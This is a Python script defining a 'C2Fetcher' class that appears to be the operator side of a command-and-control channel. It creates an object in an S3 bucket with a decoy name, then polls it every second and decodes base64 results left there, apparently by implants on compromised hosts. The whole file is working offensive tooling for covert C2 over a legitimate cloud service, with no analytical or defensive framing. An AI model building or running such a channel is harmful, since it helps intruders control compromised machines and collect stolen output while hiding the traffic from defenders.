import sys, os, socket
import threading, time
from urllib.parse import urlparse, unquote
from base64 import b64decode, b64encode
from datetime import datetime
import boto3
from botocore.exceptions import ClientError, NoCredentialsError
from io import BytesIO

class C2Fetcher():
    def __init__(self, s3Client, bucket, key):
        self.s3Client = s3Client
        self.bucket = bucket
        self.key = key
        self.last_time = datetime.now()
        try:
            self.s3Client.put_object(Body=b"", Bucket=bucket, Key=key)
        except Exception as err:
            print(err)
            os._exit(-1)
    
    def fetch_response(self):
        try:
            resp = self.s3Client.get_object(Bucket=self.bucket, Key = self.key, IfModifiedSince=self.last_time)
            if resp['ResponseMetadata']['HTTPStatusCode'] == 200:
                self.last_time = resp['LastModified']
                content = resp['Body'].read().decode('utf-8')
                if len(content) > 0:
                    print(b64decode(content).decode('utf-8'))
        except ClientError as err:
            if err.response["Error"]["Code"]=="304":
                return
            print(err)
        except NoCredentialsError as err:
            print("Please load dummy AWS credentials !")
            os._exit(-1)
        except Exception as err:
            print(err)
            pass

    def start(self):
        print("Starting a loop fetching results from S3", self.bucket)
        
        try:
            while 1:
                self.fetch_response()
                time.sleep(1)
        except KeyboardInterrupt:
            print("\nShutting down fetcher per users request.")

if __name__ == '__main__':
    BUCKET="my-archives-packets-linux"
    KEY ="response.html"
    s = C2Fetcher(boto3.client('s3'), BUCKET, KEY)
    t = threading.Thread(target=s.start)
    t.daemon=True
    t.start()
    time.sleep(123)